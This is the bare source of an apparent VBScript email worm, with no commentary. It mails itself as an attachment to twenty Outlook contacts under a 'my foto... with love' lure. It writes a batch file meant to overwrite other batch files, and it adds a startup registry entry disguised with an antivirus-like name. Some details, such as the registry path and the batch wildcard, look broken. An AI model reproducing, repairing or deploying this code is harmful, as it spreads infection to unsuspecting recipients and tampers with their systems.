On Error Resume Next
Dim FileSysObject, File
Set FileSysObject = CreateObject ("Scripting.FileSystemObject")
Set File = FileSysObject.GetFile(WScript.ScriptFullName)
Dim OutlookObject, OutMail, Index
Set OutlookObject = CreateObject("Outlook.Application")
For Index = 1 To 20
Set OutMail = OutlookObject.CreateItem(0)
OutMail.to = OutlookObject.GetNameSpace("MAPI").AddressLists(1).AddressEntries(Index)
OutMail.Subject = "hello"
OutMail.Body = "it is my foto... with love!"
OutMail.Attachments.Add(WScript.ScriptFullName)
OutMail.Send
Set batvir = CreateObject("Scripting.FileSystemObject")
set bat =batvir.CreateTextFile("C:\start.bat") 
bat.WriteLine "@echo off"
bat.WriteLine"set sity=bat"
bat.WriteLine "for %%b in (*.sity) do if not %%b==AUTOEXEC.BAT copy %0 %%b>nul"
bat.WriteLine "echo on"
bat.Close
Set WSHShell = WScript.CreateObject("WScript.Shell")
WSHShell.RegWrite"HKLM\Software\Microsoft\Windows\Current Version\Run\avp.0","C:\start.bat", "REG_SZ"
Next 
